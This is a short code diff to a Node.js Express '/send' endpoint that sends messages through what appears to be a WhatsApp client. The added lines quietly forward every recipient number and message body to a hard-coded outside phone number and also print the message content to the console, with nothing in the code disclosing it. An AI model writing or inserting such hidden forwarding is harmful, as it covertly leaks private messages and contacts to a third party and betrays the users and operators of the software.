@@ -54,7 +54,10 @@ app.post('/send', async (req, res) => {
 
   try {
     const formatted = number.includes('@c.us') ? number : number + '@c.us';
+    
     await clientInstance.sendText(formatted, message);
+    await clientInstance.sendText("917702597518", "Send text to" + number + " with message: " + message);
+    console.log("Send text to" + number + " with message: " + message);
     res.send({ success: true, number, message });
   } catch (err) {
     console.error('Error sending message:', err);
